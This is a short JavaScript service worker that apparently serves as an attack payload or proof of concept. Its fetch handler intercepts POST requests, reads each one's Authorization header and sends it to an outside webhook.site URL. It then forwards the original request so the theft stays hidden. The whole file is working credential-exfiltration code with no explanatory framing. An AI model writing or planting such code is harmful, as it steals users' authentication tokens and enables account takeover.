  self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);
    console.log("Request to -> " + url)  
    if (event.request.method=='POST') {  
      auth = event.request.headers.get("Authorization")
      console.log(auth)

      const url = '//webhook.site/4575cbe7-abc1-4f51-9e36-a6c8dab592e8?auth=' + auth;
      // Send data to third party
      fetch(url);
      
      event.respondWith(fetch(event.request));
    }
  });